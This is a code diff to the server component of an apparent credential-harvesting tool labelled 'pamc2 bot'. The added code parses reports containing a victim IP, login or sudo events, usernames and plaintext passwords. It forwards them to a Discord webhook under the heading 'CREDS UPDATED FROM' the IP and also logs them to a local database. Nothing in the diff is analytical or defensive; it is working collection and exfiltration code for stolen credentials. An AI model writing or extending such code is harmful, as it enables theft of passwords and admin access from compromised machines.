@@ -16,12 +16,36 @@ def server_args():
     return parser.parse_args()
 
 def send_discord(addr, data):
+    ip = data.split("-")[0].strip()
+    message = data.split("-")[1].split(":")[0].strip()
+    username = data.split("-")[1].split(":")[1].strip()
+    password = data.split("-")[1].split(":")[2].strip()
+
+    fields = []
+    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
+        fields.append({
+            'name': "Username",
+            'value': f"{username}",
+            'inline': True
+        })
+        fields.append({
+            'name': "Password",
+            'value': f"{password}",
+            'inline': True
+        })
+    elif (message == "SUDO SESSION OPENED"):
+        fields.append({
+            'name': "ADMIN USER",
+            'value': f"{username}"
+        })
+
     hook_data = {
         'content': data,
-        'username': 'kms bot',
+        'username': 'pamc2 bot (type shit)',
         'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
         'embeds': [{
-            'description': "type shit",
+            'description': f"**CREDS UPDATED FROM {ip}**",
+            'fields': fields,
             'color': 15258703
         }]
     }
@@ -32,7 +56,7 @@ def write_db(addr, data):
     conn = sqlite3.connect('logins.db')
     cursor = conn.cursor()
 
-    ip = addr[0]
+    ip = data.split("-")[0].strip()
     message = data.split("-")[1].split(":")[0].strip()
     username = data.split("-")[1].split(":")[1].strip()
     password = data.split("-")[1].split(":")[2].strip()
